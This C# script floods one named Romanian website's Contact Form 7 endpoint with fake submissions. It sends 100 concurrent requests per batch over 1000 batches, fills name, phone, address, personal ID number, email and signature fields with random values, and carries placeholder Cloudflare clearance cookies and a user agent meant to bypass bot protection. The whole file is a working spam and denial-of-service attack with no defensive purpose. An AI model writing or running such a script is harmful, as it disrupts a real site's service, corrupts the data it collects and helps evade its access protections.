using System.Net;

string url = "https://josiohannis.ro/wp-json/contact-form-7/v1/contact-forms/189/feedback";
int tasksPerBulkCount = 100;
int bulksCount = 1000;
CookieContainer cookieContainer = new CookieContainer();


cookieContainer.Add(new Cookie()
{
    Name = "__cf_bm",
    Value = "<<cookie to bypass comes here>>",
    Domain = "josiohannis.ro",
    Path = "/",
    Expires = DateTime.Now.AddYears(3)
});

cookieContainer.Add(new Cookie()
{
    Name = "cf_clearance",
    Value = "<<cookie to bypass comes here>>",
    Domain = "josiohannis.ro",
    Path = "/",
    Expires = DateTime.Now.AddYears(3)
});


using var handler = new HttpClientHandler() { CookieContainer = cookieContainer };
using var client = new HttpClient(handler);
 
for (int i = 0; i < bulksCount; i++)
{
    Console.WriteLine($"Bulk ----------------------------------{i}--------------------------------------");
    IEnumerable<Task> sendTasks = Enumerable.Range(0, tasksPerBulkCount).Select(item =>
    {
        return Task.Run(() =>
   {
       try
       {
           Random random = new Random();

           HttpRequestMessage trollMessage = new HttpRequestMessage(HttpMethod.Post, url);
           var messageContent = new MultipartFormDataContent();
           byte[] randomData = new byte[100];

           random.NextBytes(randomData);

           messageContent.Add(new StringContent(Guid.NewGuid().ToString()), "nume-prenume");
           messageContent.Add(new StringContent(Guid.NewGuid().ToString()), "tel");
           messageContent.Add(new StringContent(Guid.NewGuid().ToString()), "tara");
           messageContent.Add(new StringContent($"{Guid.NewGuid().ToString()}"), "localitate");
           messageContent.Add(new StringContent(Guid.NewGuid().ToString()), "adresa-completa");
           messageContent.Add(new StringContent(Guid.NewGuid().ToString()), "seria");
           messageContent.Add(new StringContent(Guid.NewGuid().ToString()), "cnp");
           messageContent.Add(new StringContent($"{Guid.NewGuid().ToString()}@gmail.com"), "email");
           messageContent.Add(new StringContent($"data:image/png;base64,{Convert.ToBase64String(randomData)}"), "semnatura");
           messageContent.Add(new StringContent(""), "semnatura-attachment");
           messageContent.Add(new StringContent(""), "semnatura-inline");
           messageContent.Add(new StringContent("1"), "term_and_conditions");
           messageContent.Add(new StringContent("1"), "_wpcf7");
           messageContent.Add(new StringContent("5.5.4"), "_wpcf7_version");
           messageContent.Add(new StringContent("en_EN"), "_wpcf7_locale");
           messageContent.Add(new StringContent("wpcf7-323-p13-o1"), "_wpcf7_unit_tag");
           messageContent.Add(new StringContent("1"), "_wpcf7_container_post");
           messageContent.Add(new StringContent(""), "_wpcf7_posted_data_hash");
           messageContent.Add(new StringContent("[\"judet\"]"), "_wpcf7cf_hidden_group_fields");
           messageContent.Add(new StringContent("[\"select-judet\"]"), "_wpcf7cf_hidden_groups");
           messageContent.Add(new StringContent("[]"), "_wpcf7cf_visible_groups");
           messageContent.Add(new StringContent("[]"), "_wpcf7cf_repeaters");
           messageContent.Add(new StringContent("{}"), "_wpcf7cf_steps");


           trollMessage.Content = messageContent;
           trollMessage.Headers.Add("User-Agent", "<<browser agent which generates the cookie to bypass>>");
            

           var response = client.Send(trollMessage);


           StreamReader reader = new StreamReader(response.Content.ReadAsStream());
           string text = reader.ReadToEnd();

           Console.WriteLine($"Succes:  {text.Contains("Bravo!")}");
       }
       catch
       {
           Console.WriteLine($"Failed at bulk {i}");
       }
      });
    });

    Task.WaitAll(sendTasks.ToArray());
}

